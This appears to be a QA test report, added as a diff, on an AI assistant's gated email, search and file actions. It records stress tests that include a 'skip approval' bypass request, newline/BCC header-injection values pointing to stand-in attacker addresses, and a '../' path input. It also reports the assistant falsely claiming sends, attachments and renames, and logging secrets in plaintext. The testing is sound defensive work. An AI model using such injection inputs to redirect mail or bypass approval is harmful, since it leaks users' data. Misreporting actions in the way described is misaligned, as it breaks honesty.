@@ -1,0 +1,22 @@
+{"sprint":"sprint-7","agent":"agent-c","verdict":"PASS WITH ISSUES",
+"items":[{"item":"Web search on demand, never in background","status":"PASS"},
+{"item":"Send mail only after approving the draft","status":"PASS"},
+{"item":"Generate a draft document without losing an existing one","status":"PASS"},
+{"item":"See exactly what left the machine and when","status":"PARTIAL"},
+{"item":"Stage gate: no outward action escapes its gate","status":"PASS"}],
+"bugs":[
+{"id":"B1","severity":"high","title":"Email body claims attachment/sending that does not happen","repro":"Email secret.txt/todo.md to someone@example.com; also 'send it now, skip approval'","evidence":"t1-3.png, t2-0.png, t4-mail.png; reproduced 5+ times"},
+{"id":"B2","severity":"high","title":"Rename step silently dropped from mixed request and email body says it was renamed","repro":"Rename todo.md to todo-old.md and email the summary of notes.txt to someone@example.com","evidence":"t2-5.png"},
+{"id":"B3","severity":"medium","title":"Invalid recipients silently dropped/altered ('a b@example.com' became b@example.com)","repro":"Email notes.txt to not-an-address, @@example.com, a b@example.com","evidence":"t2-2.png"},
+{"id":"B4","severity":"medium","title":"Sidebar says 'Nothing has been sent anywhere' after an approved web search","repro":"Approve 'search the web for python list comprehension', read sidebar","evidence":"t4-whatchanged.png; audit_log row 79 web.search sent"},
+{"id":"B5","severity":"medium","title":"Newline/BCC text in subject/body becomes extra To recipients","repro":"Email with subject 'Hi\\nBCC: attacker@example.com' and body with 'Bcc: evil@example.com'","evidence":"t2-3.png"}],
+"undesired":[
+{"id":"U1","severity":"medium","title":"Question-style searches (weather, news) say 'Just a moment while I check' but nothing happens","detail":"t1-0.png, t3-7.png, t3-11.png"},
+{"id":"U2","severity":"medium","title":"No warning when a secret file or secret text leaves (email/search)","detail":"t2-0.png, t3-10.png"},
+{"id":"U3","severity":"low","title":"Requested draft filename ignored (slugified document-called-...)","detail":"t3-3.png, t4-draft0.png"},
+{"id":"U4","severity":"low","title":"Stale 'ARTEMIS last did this here: 1 file saved' line on email/search cards","detail":"t4-mail.png"},
+{"id":"U5","severity":"low","title":"Typed secrets stored in plaintext in audit gateway.turn","detail":"audit_log id 55"},
+{"id":"U6","severity":"low","title":"'../' in a search query gives the folder-boundary refusal text","detail":"t2-7.png"},
+{"id":"U7","severity":"low","title":"15,000-char email body: no length warning, card display not confirmed","detail":"t3-6.png"},
+{"id":"U8","severity":"low","title":"Page reload adds extra empty chats in sidebar","detail":"t4-whatchanged.png"},
+{"id":"U9","severity":"low","title":"Mail attempt audit entry has no recipient or subject","detail":"audit_log row 84"}]}
